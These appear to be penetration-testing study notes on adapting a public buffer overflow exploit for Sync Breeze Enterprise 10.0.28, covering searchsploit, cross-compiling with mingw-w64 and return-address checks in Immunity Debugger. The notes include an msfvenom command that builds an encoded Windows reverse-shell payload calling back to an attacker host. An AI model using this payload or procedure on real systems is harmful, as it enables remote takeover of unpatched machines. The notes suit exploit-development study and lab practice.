---
tags: ImmunityDebugger
---
## Buffer overflow

Basic stack buffer overflow steps (assume no ASLR or Executable Space Protection):
1. Create large buffer to trigger overflow
2. Pad buffer and overwrite EIP to appropriate address
3. Include payload in buffer prepended by an optional NOP slide
4. Choose a correct return address instruction such as JMP ESP to redirect execution flow to payload

Things to consider when using public exploit:
- We should verify if the return address used in the original exploit is correct by cloning the target environment locally in a VM and using a debugger on the vulnerable software.
- We must also consider changing the payload contained in the original exploit code.
- Public exploits present an inherent danger because they often contain hex-encoded payloads that must be reverse-engineered to determine how they function. Because of this, we must always review the payloads used in public exploits or better yet, insert our own.
- When creating own payload, include our own IP address and port number. Exclude certain bad characters (e.g.`\x00`) which will break the application when included in the payload.

## Importing and Examining the Exploit

Example: target *Sync Breeze Enterprise 10.0.28*
1. Search available exploits for this product and version:
   `searchsploit "Sync Breeze Enterprise 10.0.28"`
2. Avoid Denial of Service exploits. Focus on the Remote Buffer Over exploits.
3. Copy searchsploit script to current directory:
   `searchsploit -m windows/dos/42341.c`
4. Examine the exploit

## Cross-Compiling Exploit Code

Python: scripting language, executed through an interpreter instead of compiled to create a standalone executable

C: needs to be compiled into a standalone executable

> Notice any headers in the C code which may indicate that the code should be compiled on a specific OS (e.g. `winsock2.h` would indicate that the code should be compiled on Windows)

To avoid compilation issues, it is generally recommended to use native compilers for the specific operating system targeted by the code.

To execute cross-compiled code meant for Windows on Kali, use **wine**.

#### mingw-w64

mingw-w64: a cross-compiler for compiling code into PE file on Linux

Install mingw-w64:
`sudo apt install mingw-w64`

Compile code into PE file:
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`

## Fixing the Exploit

- Adjust hardcoded IP address and port
- Check the return address: if it is not a part of the vulnerable software, is it present in the target? 
	- Procedure:
		1. Start Sync Breeze Service on the Windows 10 client
		2. Launch Immunity Debugger as admin, click File > Attach, select *syncbrs* process
		3. Click View > Executable modules
		4. Verify if the dll that the return address uses is present
	- Solutions:
		- Reference another exploit which is marked as **EDB Verified** on the exploit-db website (e.g. https://www.exploit-db.com/exploits/42928) and use the return address used by that exploit instead.
		- Recreate the target environment locally and use a debugger to determine this address
		- Use information from other publicly-available exploits to find a reliable return address that will match our target environment. (E.g. search for a return address for a JMP ESP instruction on Windows Server 2019)
		- During a “vanilla” buffer overflow, we should not rely on hard-coded JMP ESP addresses coming from system DLLs, since these are all randomized at boot time due to ASLR. Instead, we should try to find these instructions in non-ASLR modules inside the vulnerable application whenever possible.
- Can generate own payload with msfvenom (note bad chars (may be listed in the original exploit code), platform (e.g. x86), code format (e.g. C))
	- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
		- `-b "[bad chars]"`: specify bad chars

## Testing the Exploit

 Tool: Immunity Debugger (Windows)
 1. Attach target software
 2. Press Ctrl + G
 3. Press F2 to set breakpoint at the JMP ESP address
 4. Run application and attempt to execute exploit from Kali
 5. Check if the value in EIP at the breakpoint is correct
 6. Debug and repeat

